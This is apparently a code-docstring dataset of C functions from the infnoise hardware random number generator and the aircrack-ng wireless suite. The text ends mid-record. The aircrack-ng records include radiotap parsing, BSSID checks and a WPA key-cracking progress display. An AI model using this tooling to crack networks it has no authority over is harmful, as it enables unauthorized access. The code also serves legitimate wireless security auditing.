{"docstring": "// Initialize the entropy check.  N is the number of bits used to predict the next bit.\n// At least 8 bits must be used, and no more than 30.  In general, we should use bits\n// large enough so that INM output will be uncorrelated with bits N samples back in time.\n", "func_signal": "bool inmEntCheckStart(uint8_t N, uint8_t numStreams, bool debug)", "code": "{\n    if(N < 1u || N > 30u) {\n        return false;\n    }\n    inmDebug = debug;\n    inmNumBitsOfEntropy = 0u;\n    inmCurrentProbability = 1.0;\n    inmN = N;\n    inmNumStreams = numStreams;\n    inmPrevBits = 0u;\n    inmOnes = calloc(numStreams, sizeof(uint32_t *));\n    inmZeros = calloc(numStreams, sizeof(uint32_t *));\n    if(inmOnes == NULL || inmZeros == NULL) {\n        return false;\n    }\n    uint8_t i;\n    for(i = 0u; i < numStreams; i++) {\n        inmOnes[i] = calloc(1u << N, sizeof(uint32_t));\n        inmZeros[i] = calloc(1u << N, sizeof(uint32_t));\n        if(inmOnes[i] == NULL || inmZeros[i] == NULL) {\n            return false;\n        }\n    }\n    inmTotalBits = 0u;\n    inmPrevBit = false;\n    resetStats();\n    return true;\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Initialize the Infinite Noise Multiplier USB ineterface.\n", "func_signal": "static bool initializeUSB(FT_HANDLE *ftdic, char **message)", "code": "{\n    *message = NULL;\n\n    // Open FTDI device based on FT240X vendor & product IDs\n\tif (FT_Open(0, ftdic) != FT_OK) {\n\t\t*message = \"Can't find Infinite Noise Multiplier\\n\";\n\t\treturn false;\n\t}\n\n    // Set high baud rate\n\tif (FT_SetBaudRate(*ftdic, 30000) != FT_OK) {\n        *message = \"Setting baud rate failed\\n\";\n        return false;\n    }\n\n    // Enable syncrhonous bitbang mode\n\tif (FT_SetBitMode(*ftdic, MASK, BITMODE_SYNCBB) != FT_OK) {\n        *message = \"Can't enable bit-bang mode\\n\";\n        return false;\n    }\n    \n    // Just test to see that we can write and read.\n    uint8_t buf[64] = {0,};\n\tDWORD bytesWritten;\n    if(FT_Write(*ftdic, buf, 64, &bytesWritten) != FT_OK || bytesWritten != 64) {\n        *message = \"USB write failed\\n\";\n        return false;\n    }\n\tDWORD bytesRead;\n    if(FT_Read(*ftdic, buf, 64, &bytesRead) != FT_OK || bytesRead != 64) {\n        *message = \"USB read failed\\n\";\n        return false;\n    }\n    return true;\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// If running continuously, it is possible to start overflowing the 32-bit counters for\n// zeros and ones.  Check for this, and scale the stats if needed.\n", "func_signal": "static void scaleEntropy(void)", "code": "{\n    if(inmNumBitsSampled == INM_MIN_DATA) {\n        inmNumBitsOfEntropy >>= 1u;\n        inmNumBitsSampled >>= 1u;\n    }\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// If running continuously, it is possible to start overflowing the 32-bit counters for\n// zeros and ones.  Check for this, and scale the stats if needed.\n", "func_signal": "static void scaleZeroOneCounts(void)", "code": "{\n    uint64_t maxVal = inmTotalZeros >= inmTotalOnes? inmTotalZeros : inmTotalOnes;\n    if(maxVal == INM_MIN_DATA) {\n        inmTotalZeros >>= 1u;\n        inmTotalOnes >>= 1u;\n    }\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// This should be called for each bit generated.\n", "func_signal": "bool inmEntCheckAddBit(bool bit)", "code": "{\n    uint8_t stream = inmTotalBits % inmNumStreams;\n    inmTotalBits++;\n    inmPrevBits = (inmPrevBits << 1u) & ((1u << inmN)-1u);\n    if(inmPrevBit) {\n        inmPrevBits |= 1;\n    }\n    inmPrevBit = bit;\n    if(inmNumBitsSampled > 100u) {\n        if(bit) {\n            inmTotalOnes++;\n        } else {\n            inmTotalZeros++;\n        }\n    }\n    uint32_t *zeros = inmZeros[stream];\n    uint32_t *ones = inmOnes[stream];\n    uint32_t numZeros, numOnes;\n    numZeros = zeros[inmPrevBits];\n    numOnes = ones[inmPrevBits];\n    uint32_t total = numZeros + numOnes;\n    if(bit) {\n        if(numOnes != 0u) {\n            inmCurrentProbability *= (double)numOnes/total;\n        }\n    } else {\n        if(numZeros != 0u) {\n            inmCurrentProbability *= (double)numZeros/total;\n        }\n    }\n    while(inmCurrentProbability <= 0.5) {\n        inmCurrentProbability *= 2.0;\n        inmNumBitsOfEntropy++;\n    }\n    //printf(\"probability:%f\\n\", inmCurrentProbability);\n    inmNumBitsSampled++;\n    if(bit) {\n        ones[inmPrevBits]++;\n        if(ones[inmPrevBits] == INM_MAX_COUNT) {\n            scaleStats();\n        }\n    } else {\n        zeros[inmPrevBits]++;\n        if(zeros[inmPrevBits] == INM_MAX_COUNT) {\n            scaleStats();\n        }\n    }\n    scaleEntropy();\n    scaleZeroOneCounts();\n    return true;\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Extract a value form 0 to 15 from the ADDR0 .. ADDR3 bits.\n", "func_signal": "static uint8_t extractAddress(uint8_t value)", "code": "{\n    uint8_t addr = 0;\n    if(value & (1 << ADDR0)) {\n        addr |= 1;\n    }\n    if(value & (1 << ADDR1)) {\n        addr |= 2;\n    }\n    if(value & (1 << ADDR2)) {\n        addr |= 4;\n    }\n    if(value & (1 << ADDR3)) {\n        addr |= 8;\n    }\n    return addr;\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Print the tables of statistics.\n", "func_signal": "static void inmDumpStats(void)", "code": "{\n    uint32_t i, j;\n    for(i = 0u; i < inmNumStreams; i++) {\n        printf(\"*************************************** stream %u\\n\", i);\n        for(j = 0u; j < 1u << inmN; j++) {\n            printf(\"%x ones:%u(%.2g%%) zeros:%u(%.2g%%)\\n\", j, inmOnes[i][j],\n                inmOnes[i][j]*100.0/inmTotalBits, inmZeros[i][j],\n                inmZeros[i][j]*100.0/inmTotalBits);\n        }\n    }\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// If running continuously, it is possible to start overflowing the 32-bit counters for\n// zeros and ones.  Check for this, and scale the stats if needed.\n", "func_signal": "static void scaleStats(void)", "code": "{\n    uint32_t i, j;\n    for(i = 0u; i < inmNumStreams; i++) {\n        for(j = 0u; j < (1u << inmN); j++) {\n            inmZeros[i][j] >>= 1u;\n            inmOnes[i][j] >>= 1u;\n        }\n    }\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Open /dev/random\n", "func_signal": "void inmWriteEntropyStart(uint32_t bufLen, bool debug)", "code": "{\n    pfd.events = POLLOUT;\n    //pfd.fd = open(\"/dev/random\", O_WRONLY);\n    pfd.fd = open(\"/dev/random\", O_RDWR);\n    if(pfd.fd < 0) {\n        fprintf(stderr, \"Unable to open /dev/random\\n\");\n        exit(1);\n    }\n    inmPoolInfo = calloc(1, sizeof(struct rand_pool_info) + bufLen);\n    if(inmPoolInfo == NULL) {\n        fprintf(stderr, \"Unable to allocate memory\\n\");\n        exit(1);\n    }\n    inmFillWatermark = readNumberFromFile(FILL_PROC_FILENAME);\n    if(debug) {\n        printf(\"Entropy pool size:%u, fill watermark:%u\\n\", readNumberFromFile(SIZE_PROC_FILENAME), inmFillWatermark);\n    }\n}", "path": "infnoise/software/writeentropy.c", "commit_date": "2019-03-27 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Add the bytes to the entropy pool.  This can be unwhitenened, but the estimated bits of\n// entropy needs to be accurate or pessimistic.  Return false if the Linux entropy pool is\n// full after writing.\n", "func_signal": "void inmWriteEntropyToPool(uint8_t *bytes, uint32_t length, uint32_t entropy)", "code": "{\n    inmPoolInfo->entropy_count = entropy;\n    inmPoolInfo->buf_size = length;\n    memcpy(inmPoolInfo->buf, bytes, length);\n    //printf(\"Writing %u bytes with %u bits of entropy to /dev/random\\n\", length, entropy);\n    ioctl(pfd.fd, RNDADDENTROPY, inmPoolInfo);\n}", "path": "infnoise/software/writeentropy.c", "commit_date": "2019-03-27 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Whiten the output, if requested, with a Keccak sponge.  Output bytes only if the health\n// checker says it's OK.  Using outputMultiplier > 1 is a nice way to generate a lot more\n// cryptographically secure pseudo-random data than the INM generates.  This allows a user\n// to generate hundreds of MiB per second if needed, for use as cryptogrpahic keys.\n", "func_signal": "static void processBytes(FILE* outFile, uint8_t *keccakState, uint8_t *bytes, uint32_t entropy, bool raw,\n        bool writeDevRandom, uint32_t outputMultiplier)", "code": "{\n    if(raw) {\n        // In raw mode, we just output raw data from the INM.\n        outputBytes(outFile, bytes, BUFLEN/8, entropy, writeDevRandom);\n        return;\n    }\n    // Note that BUFLEN has to be less than 1600 by enough to make the sponge secure,\n    // since outputting all 1600 bits would tell an attacker the Keccak state, allowing\n    // him to predict any further output, when outputMultiplier > 1, until the next call\n    // to processBytes.  All 512 bits are absorbed before sqeezing data out to insure that\n    // we instantly recover (reseed) from a state compromise, which is when an attacker\n    // gets a snapshot of the keccak state.  BUFLEN must be a multiple of 64, since\n    // Keccak-1600 uses 64-bit \"lanes\".\n    KeccakAbsorb(keccakState, bytes, BUFLEN/64);\n    uint8_t dataOut[16*8];\n    while(outputMultiplier > 0) {\n        // Write up to 1024 bits at a time.\n        uint32_t numLanes = 16;\n        if(outputMultiplier < 4) {\n            numLanes = outputMultiplier*4;\n        }\n        KeccakExtract(keccakState, dataOut, numLanes);\n        // Extract does not do a permute, so do it here.\n        KeccakPermutation(keccakState);\n        uint32_t entropyThisTime = entropy;\n        if(entropyThisTime > numLanes*64) {\n            entropyThisTime = numLanes*64;\n        }\n        outputBytes(outFile, dataOut, numLanes*8, entropyThisTime, writeDevRandom);\n        outputMultiplier -= numLanes/4;\n        entropy -= entropyThisTime;\n    }\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Extract the INM output from the data received.  Basically, either COMP1 or COMP2\n// changes, not both, so alternate reading bits from them.  We get 1 INM bit of output\n// per byte read.  Feed bits from the INM to the health checker.  Return the expected\n// bits of entropy.\n", "func_signal": "static uint32_t extractBytes(uint8_t *bytes, uint8_t *inBuf, bool raw)", "code": "{\n\tif (raw) {\n\t\t// We don't currently using `raw` in here\n\t}\n    inmClearEntropyLevel();\n    //printf(\"New batch\\n\");\n    uint32_t i;\n    for(i = 0; i < BUFLEN/8; i++) {\n        uint32_t j;\n        uint8_t byte = 0;\n        for(j = 0; j < 8; j++) {\n            //printf(\"%x \", inBuf[i*8 + j] & ~MASK);\n            uint8_t val = inBuf[i*8 + j];\n            uint8_t evenBit = (val >> COMP2) & 1;\n            uint8_t oddBit = (val >> COMP1) & 1;\n            bool even = j & 1; // Use the even bit if j is odd\n            uint8_t bit = even? oddBit : evenBit;\n            byte = (byte << 1) | bit;\n            // This is a good place to feed the bit from the INM to the health checker.\n\t\t\tuint8_t addr = extractAddress(val);\n\t\t\tif(!inmHealthCheckAddBit(evenBit, oddBit, even)) {\n                fputs(\"Health check of Infinite Noise Multiplier failed!\\n\", stderr);\n\t\t\t\tfprintf(stderr, \"Address: %u, adding evenBit:%u oddBit:%u even:%u\\n\", addr, evenBit, oddBit, even);\n\t\t\t\texit(1);\n            }\n        }\n        //printf(\"extracted byte:%x\\n\", byte);\n        bytes[i] = byte;\n    }\n    return inmGetEntropyLevel();\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "/*\n// Return the difference in the times as a double in microseconds.\nstatic double diffTime(struct timespec *start, struct timespec *end) {\n    uint32_t seconds = end->tv_sec - start->tv_sec;\n    int32_t nanoseconds = end->tv_nsec - start->tv_nsec;\n    return seconds*1e6 + nanoseconds/1000.0;\n}\n*/\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    FT_HANDLE ftdic;\n    bool raw = false;\n    bool debug = false;\n    bool writeDevRandom = false;\n    bool noOutput = false;\n\tchar* outFileName = NULL;\n    uint32_t outputMultiplier = 2;\n    int xArg;\n\n    // Process arguments\n    for(xArg = 1; xArg < argc; xArg++) {\n        if(!strcmp(argv[xArg], \"--raw\")) {\n            raw = true;\n        } else if(!strcmp(argv[xArg], \"--debug\")) {\n            debug = true;\n        } else if(!strcmp(argv[xArg], \"--dev-random\")) {\n            writeDevRandom = true;\n        } else if(!strcmp(argv[xArg], \"--no-output\")) {\n            noOutput = true;\n        } else if(!strcmp(argv[xArg], \"--multiplier\") && xArg+1 < argc) {\n            xArg++;\n            outputMultiplier = atoi(argv[xArg]);\n            if(outputMultiplier == 0) {\n                fputs(\"Multiplier must be > 0\\n\", stderr);\n                return 1;\n            }\n\t\t} else if(!strcmp(argv[xArg], \"--help\") || !strcmp(argv[xArg], \"--?\") || xArg < argc-1) {\n\t\t\t// Got a help option or something unexpected that's not the final arg\n            fputs(\n\t\t\t\t\"Usage: infnoise [options] [outFile]\\n\"\n                \"Options are:\\n\"\n                \"    --debug - turn on some debug output\\n\"\n                \"    --dev-random - write entropy to /dev/random instead of stdout\\n\"\n                \"    --raw - do not whiten the output\\n\"\n                \"    --multiplier <value> - write 256 bits * value for each 512 bits written to\\n\"\n                \"      the Keccak sponge\\n\"\n                \"    --no-output - do not write random output data\\n\", stderr);\n            return 1;\n        }\n\t\telse {\n\t\t\t// Final unparsed arg == output file specified\n\t\t\toutFileName = argv[xArg];\n\t\t}\n    }\n\n\tFILE* outFile;\n\tif (outFileName) {\n\t\toutFile = _fsopen(outFileName, \"wb\", _SH_DENYWR);\n\t\tif (!outFile) {\n\t\t\tfprintf(stderr, \"Unable to open file %s\\n\", argv[xArg]);\n\t\t\treturn 1;\n\t\t}\n\t} else {\n\t\toutFile = stdout;\n\t\tfflush(outFile);\n\t\tint result = _setmode(_fileno(outFile), _O_BINARY);\n\t\tif (result == -1) {\n\t\t\tfprintf(stderr, \"Cannot set binary mode for outFile\");\n\t\t\treturn 1;\n\t\t}\n\t}\n\n/*    if(writeDevRandom) {\n        inmWriteEntropyStart(BUFLEN/8, debug);\n    }\n*/\n\n    if(!inmHealthCheckStart(PREDICTION_BITS, DESIGN_K, debug)) {\n        fputs(\"Can't initialize health checker\\n\", stderr);\n        return 1;\n    }\n    uint8_t keccakState[KeccakPermutationSizeInBytes];\n    KeccakInitializeState(keccakState);\n\n    char *message;\n    if(!initializeUSB(&ftdic, &message)) {\n        // Sometimes have to do it twice - not sure why\n        //ftdi_usb_close(&ftdic);\n        if(!initializeUSB(&ftdic, &message)) {\n            fputs(message, stderr);\n            return 1;\n        }\n    }\n\n    // Endless loop: set SW1EN and SW2EN alternately\n    uint32_t i;\n    uint8_t outBuf[BUFLEN], inBuf[BUFLEN];\n    for(i = 0; i < BUFLEN; i++) {\n        // Alternate Ph1 and Ph2 - maybe should have both off in between\n        outBuf[i] = i & 1?  (1 << SWEN2) : (1 << SWEN1);\n        outBuf[i] |= makeAddress(i & 0xf);\n    }\n\n\tuint64_t good = 0;\n/*\n    uint64_t bad = 0;\n*/\n    while(true) {\n/*\n        struct timespec start;\n        clock_gettime(CLOCK_REALTIME, &start);\n*/\n\t\tDWORD numBytes;\n        if(FT_Write(ftdic, outBuf, BUFLEN, &numBytes) != FT_OK || numBytes != BUFLEN) {\n            fputs(\"USB write failed\\n\", stderr);\n            return -1;\n        }\n        if(FT_Read(ftdic, inBuf, BUFLEN, &numBytes) != FT_OK || numBytes != BUFLEN) {\n            fputs(\"USB read failed\\n\", stderr);\n            return -1;\n        }\n/*\n        struct timespec end;\n        clock_gettime(CLOCK_REALTIME, &end);\n        uint32_t us = diffTime(&start, &end);\n        //printf(\"diffTime:%u us\\n\", us);\n*/\n//        if(us <= MAX_MICROSEC_FOR_SAMPLES) {\n            uint8_t bytes[BUFLEN/8];\n            uint32_t entropy = extractBytes(bytes, inBuf, raw);\n            if(!noOutput && inmHealthCheckOkToUseData() && inmEntropyOnTarget(entropy, BUFLEN)) {\n                processBytes(outFile, keccakState, bytes, entropy, raw, writeDevRandom, outputMultiplier);\n            }\n            good++;\n  /*      } else {\n            bad++;\n        }\n*/\n        //if(((good + bad) & 0xff) == 0) {\n            //printf(\"Good %lu, bad %lu\\n\", good, bad);\n        //}\n\t\t\tfflush(stdout);\n\t\t\tfflush(stderr);\n    }\n    return 0;\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Write the bytes to either stdout, or /dev/random.  Use the lower of the measured\n// entropy and the provable lower bound on average entropy.\n", "func_signal": "static void outputBytes(FILE* outFile, uint8_t *bytes, uint32_t length, uint32_t entropy, bool writeDevRandom)", "code": "{\n    if(entropy > inmExpectedEntropyPerBit*BUFLEN/INM_ACCURACY) {\n        entropy = (uint32_t)(inmExpectedEntropyPerBit*BUFLEN/INM_ACCURACY);\n    }\n    if(!writeDevRandom) {\n        if(fwrite(bytes, 1, length, outFile) != length) {\n            fputs(\"Unable to write output from Infinite Noise Multiplier\\n\", stderr);\n            exit(1);\n        }\n\t\tfflush(outFile);\n    } else {\n\t\tfprintf(stderr, \"/dev/random not supported in Windows\");\n\t\texit(1);\n    }\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Find the entropy pool size.\n", "func_signal": "static uint32_t readNumberFromFile(char *fileName)", "code": "{\n    FILE *file = fopen(fileName, \"r\");\n    if(file == NULL) {\n        fprintf(stderr, \"Unable to open %s\\n\", fileName);\n        exit(1);\n    }\n    uint32_t value = 0u;\n    char c;\n    while( (c = getc(file)) != EOF\n           && '0' <= c && c <= '9' ) {\n        value *= 10;\n        value += c - '0';\n    }\n    fclose(file);\n    return value;\n}", "path": "infnoise/software/writeentropy.c", "commit_date": "2019-03-27 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Role a single die.\n", "func_signal": "static void rollDie(uint32_t sides, FILE *file)", "code": "{\n  uint32_t randVal;\n  do {\n    uint32_t numBytes = 0u;\n    randVal = 0u;\n    while (1u << (8u*numBytes) <= sides) {\n      numBytes++;\n      int c = getc(file);\n      if (c == EOF) {\n        printf(\"Ran out of random data\\n\");\n        exit(1);\n      }\n      randVal = (randVal << 8u) | getc(file);\n    }\n  } while(randVal >= sides);\n  printf(\" %u\", randVal + 1u);\n}", "path": "infnoise/software/tools/dice.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// obuf has to be at lease size long.  This function will unwind the SSE-para buffers into a flat.\n", "func_signal": "void getbuf_stuff_mpara_mmx(unsigned char *oBuf, void *buf, unsigned int size, unsigned int index)", "code": "{\n\tunsigned int i;\n\tfor(i=0;i<size;i++)\n\t\t*oBuf++ = ((unsigned char*)buf)[GETPOSMPARA(i, index)];\n}", "path": "aircrack-ng-archive/src/memory.c", "commit_date": "2017-10-20 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* end of ifconfig */\n", "func_signal": "static void get_radiotap_info(struct priv_fbsd *pf,\n\t\t\t      struct ieee80211_radiotap_header *rth, int *plen,\n\t\t\t      struct rx_info *ri)", "code": "{\n        uint32_t present;\n\tuint8_t rflags = 0;\n\tint i;\n\tunsigned char *body = (unsigned char*) (rth+1);\n\tint dbm_power = 0, db_power = 0;\n\n\t/* reset control info */\n\tif (ri)\n\t\tmemset(ri, 0, sizeof(*ri));\n\n       \t/* get info */\n\tpresent = le32toh(rth->it_present);\n\tfor (i = IEEE80211_RADIOTAP_TSFT; i <= IEEE80211_RADIOTAP_EXT; i++) {\n\t\tif (!(present & (1 << i)))\n\t\t\tcontinue;\n\n\t\tswitch (i) {\n\t\tcase IEEE80211_RADIOTAP_TSFT:\n\t\t\tbody += sizeof(uint64_t);\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_FLAGS:\n\t\t\trflags = *((uint8_t*)body);\n\t\t\t/* fall through */\n\t\tcase IEEE80211_RADIOTAP_RATE:\n\t\t\tbody += sizeof(uint8_t);\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_CHANNEL:\n\t\t\tif (ri) {\n\t\t\t\tuint16_t *p = (uint16_t*) body;\n\t\t\t\tint c = ieee80211_mhz2ieee(*p, *(p+1));\n\n\t\t\t\tri->ri_channel = c;\n\t\t\t}\n\t\t\tbody += sizeof(uint16_t)*2;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_FHSS:\n\t\t\tbody += sizeof(uint16_t);\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DBM_ANTSIGNAL:\n\t\t\tdbm_power = *body++;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DBM_ANTNOISE:\n\t\t\tdbm_power -= *body++;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DB_ANTSIGNAL:\n\t\t\tdb_power = *body++;\n\t\t\tbreak;\n\n\t\tcase IEEE80211_RADIOTAP_DB_ANTNOISE:\n\t\t\tdb_power -= *body++;\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\ti = IEEE80211_RADIOTAP_EXT+1;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t/* set power */\n\tif (ri) {\n\t\tif (dbm_power)\n\t\t\tri->ri_power = dbm_power;\n\t\telse\n\t\t\tri->ri_power = db_power;\n\t}\n\n        /* XXX cache; drivers won't change this per-packet */\n        /* check if FCS/CRC is included in packet */\n        if (pf->pf_nocrc || (rflags & IEEE80211_RADIOTAP_F_FCS)) {\n                *plen -= IEEE80211_CRC_LEN;\n                pf->pf_nocrc = 1;\n        }\n}", "path": "aircrack-ng-archive/src/osdep/freebsd.c", "commit_date": "2015-12-05 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* Returns number of BSSIDs.\n\n    Return value is negative for failures\n*/\n", "func_signal": "int checkbssids(char *bssidlist)", "code": "{\n\tint first = 1;\n\tint failed = 0;\n\tint i = 0;\n\tchar *list, *frontlist, *tmp;\n\tint nbBSSID = 0;\n\n\tif(bssidlist == NULL) return -1;\n\n#define IS_X(x) ((x) == 'X' || (x) == 'x')\n#define VALID_CHAR(x)   ((IS_X(x)) || hexCharToInt(x) > -1)\n\n#define VALID_SEP(arg)\t( ((arg) == '_') || ((arg) == '-') || ((arg) == ':') )\n\tfrontlist = list = strdup(bssidlist);\n\tdo\n\t{\n\t\ttmp = strsep(&list, \",\");\n\n\t\tif (tmp == NULL)\n\t\t\tbreak;\n\n\t\t++nbBSSID;\n\n\t\tif(strlen(tmp) != 17) failed = 1;\n\n\t\t//first byte\n\t\tif(!VALID_CHAR(tmp[ 0])) failed = 1;\n\t\tif(!VALID_CHAR(tmp[ 1])) failed = 1;\n\t\tif(!VALID_SEP( tmp[ 2])) failed = 1;\n\n\t\t//second byte\n\t\tif(!VALID_CHAR(tmp[ 3])) failed = 1;\n\t\tif(!VALID_CHAR(tmp[ 4])) failed = 1;\n\t\tif(!VALID_SEP( tmp[ 5])) failed = 1;\n\n\t\t//third byte\n\t\tif(!VALID_CHAR(tmp[ 6])) failed = 1;\n\t\tif(!VALID_CHAR(tmp[ 7])) failed = 1;\n\t\tif(!VALID_SEP( tmp[ 8])) failed = 1;\n\n\t\t//fourth byte\n\t\tif(!VALID_CHAR(tmp[ 9])) failed = 1;\n\t\tif(!VALID_CHAR(tmp[10])) failed = 1;\n\t\tif(!VALID_SEP( tmp[11])) failed = 1;\n\n\t\t//fifth byte\n\t\tif(!VALID_CHAR(tmp[12])) failed = 1;\n\t\tif(!VALID_CHAR(tmp[13])) failed = 1;\n\t\tif(!VALID_SEP( tmp[14])) failed = 1;\n\n\t\t//sixth byte\n\t\tif(!VALID_CHAR(tmp[15])) failed = 1;\n\t\tif(!VALID_CHAR(tmp[16])) failed = 1;\n\n\t\tif(failed) {\n\t\t\tfree(frontlist);\n\t\t\treturn -1;\n\t\t}\n\n\t\tif(first)\n\t\t{\n\t\t\tfor(i=0; i< 17; i++) {\n\t\t\t\tif( IS_X(tmp[i])) {\n\t\t\t\t\tfree(frontlist);\n\t\t\t\t\treturn -1;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\topt.firstbssid = (unsigned char *) malloc(sizeof(unsigned char));\n\t\t\tif (opt.firstbssid == NULL){\n\t\t\t\tfree(frontlist);\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\tgetmac(tmp, 1, opt.firstbssid);\n\t\t\tfirst = 0;\n\t\t}\n\n\t} while(list);\n\n\t// Success\n\tfree(frontlist);\n\treturn nbBSSID;\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/**\n * Stop the reader thread (if it is running)\n * @return 0 if stopped or -1 if it failed to stop it\n */\n", "func_signal": "static int stop_reader(struct tip_cygwin *priv)", "code": "{\n\tif (priv->tc_running == 1) {\n\t\tint tries = 3;\n\n\t\tpriv->tc_running = 0;\n\t\twhile ((priv->tc_running != -1) && tries--)\n\t\t\tsleep(1);\n\n\t\tif (tries <= 0)\n\t\t\treturn -1;\n\t}\n\n\treturn 0;\n}", "path": "aircrack-ng-archive/src/osdep/cygwin_tap.c", "commit_date": "2015-08-27 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/*\n * Convert MHz frequency to IEEE channel number.\n */\n", "func_signal": "static u_int\nieee80211_mhz2ieee(u_int freq, u_int flags)", "code": "{\n        if ((flags & IEEE80211_CHAN_GSM) || (907 <= freq && freq <= 922))\n                return mapgsm(freq, flags);\n        if (freq == 2484)\n                return 14;\n        if (freq < 2484)\n                return (freq - 2407) / 5;\n        if (freq < 5000) {\n                if (flags & (IEEE80211_CHAN_HALF|IEEE80211_CHAN_QUARTER))\n                        return mappsb(freq);\n                else if (freq > 4900)\n                        return (freq - 4000) / 5;\n                else\n                        return 15 + ((freq - 2512) / 20);\n        }\n        return (freq - 5000) / 5;\n}", "path": "aircrack-ng-archive/src/osdep/freebsd.c", "commit_date": "2015-12-05 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* These are slow, but the F'n 32 bit compiler will not build these intrinsics.\n   Only the 64-bit (Win64) MSVC compiler has these as intrinsics. These slow\n   ones let me debug, and develop this code, and work, but use CPU */\n", "func_signal": "_inline __m128i _mm_set_epi64x (long long a, long long b)", "code": "{\n\t__m128i x; x.m128i_i64[0] = b; x.m128i_i64[1] = a;\n\treturn x;\n}", "path": "aircrack-ng-archive/src/sse-intrinsics.c", "commit_date": "2017-10-20 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* display the current wpa key info, matrix-like */\n", "func_signal": "void show_wpa_stats( char *key, int keylen, unsigned char pmk[32], unsigned char ptk[64],\nunsigned char mic[16], int force )", "code": "{\n\tfloat delta, calc, ksec;\n\tint i, et_h, et_m, et_s;\n\tchar tmpbuf[28];\n\tlong long int remain, eta;\n\n\tif (chrono( &t_stats, 0 ) < 0.15 && force == 0)\n\t\treturn;\n\n\tif (force != 0)\n\t\tpthread_mutex_lock(&mx_wpastats);  // if forced, wait until we can lock\n\telse\n\t\tif (pthread_mutex_trylock(&mx_wpastats) != 0)  // if not forced, just try\n\t\t\treturn;\n\n\tchrono( &t_stats, 1 );\n\n\tdelta = chrono( &t_begin, 0 );\n\n\tet_h =   delta / 3600;\n\tet_m = ( delta - et_h * 3600 ) / 60;\n\tet_s =   delta - et_h * 3600 - et_m * 60;\n\n\tif( ( delta = chrono( &t_kprev, 0 ) ) >= 6 )\n\t{\n\t\tint delta0;\n\t\tdelta0 = delta;\n\n\t\tt_kprev.tv_sec += 3;\n\t\tdelta = chrono( &t_kprev, 0 );\n\t\tnb_kprev *= delta / delta0;\n\n\t}\n\n\tif (_speed_test) {\n\t\tint ks = (int) ((float) 